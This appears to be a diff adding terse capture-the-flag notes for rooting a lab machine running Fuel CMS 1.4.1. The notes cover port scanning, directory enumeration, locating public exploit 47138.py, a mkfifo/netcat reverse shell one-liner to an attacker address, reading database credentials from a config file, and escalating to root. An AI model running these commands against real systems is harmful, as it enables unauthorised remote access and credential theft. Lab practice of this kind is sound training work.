@@ -1,0 +1,43 @@
+### PORT
+80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
+
+admin:admin
+
+dirb http://10.10.76.169 -N 403,404,400 | grep 200
+
+searchsploit fuel
+
+found 
+
+fuelCMS 1.4.1 - Remote Code Execution     | linux/webapps/47138.py
+
+/usr/share/exploitdb/exploits/linux/webapps/47138.py
+
+cp /usr/share/exploitdb/exploits/linux/webapps/47138.py fuel_cms141.py
+
+python fuel_cms141.py
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.64.179 4444 >/tmp/f
+
+nc -lnvp 4444
+
+get user_flag
+
+check fuel/application/config/database.php
+
+found:
+username: root
+password: mememe
+
+
+python -c ‘import pty; pty.spawn(“/bin/sh”)’
+su -
+
+cat /root/root.txt
+
+
+
+
+
+
+
